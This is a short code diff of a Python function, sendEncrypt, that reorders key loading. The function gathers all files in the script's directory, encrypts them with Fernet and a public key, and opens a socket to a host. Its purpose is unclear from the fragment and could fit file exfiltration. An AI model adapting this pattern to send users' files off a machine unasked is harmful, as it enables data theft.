@@ -93,18 +93,18 @@ def sendEncrypt():
     if not HOST:
         return
 
-    key = load_key()
-    fernet = Fernet(key)
-    public_key = load_public_key()
-
-    if not public_key:
-        return
-
     base_dir = os.path.dirname(os.path.abspath(__file__))
     files = get_all_files(base_dir)
 
     if not files:
         print('No files')
+        return
+    
+    key = load_key()
+    fernet = Fernet(key)
+    public_key = load_public_key()
+
+    if not public_key:
         return
 
     s = socket.socket()
